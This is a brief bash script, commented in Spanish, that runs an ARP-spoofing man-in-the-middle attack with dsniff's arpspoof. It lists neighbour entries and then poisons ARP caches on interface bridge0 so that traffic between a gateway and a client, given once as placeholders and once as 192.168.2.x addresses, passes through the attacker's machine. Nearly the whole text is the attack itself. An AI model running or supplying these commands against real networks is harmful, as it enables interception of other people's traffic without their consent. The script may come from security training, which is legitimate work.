#! /bin/bash
# dsniff
# Redirige el trafico de una red al dispositivo atacante.
ip nei
sudo arpspoof -i bridge0 -t {GATEWAY} -r {IP_CLIENT}
sudo arpspoof -i bridge0 -t 192.168.2.255 -r 192.168.2.2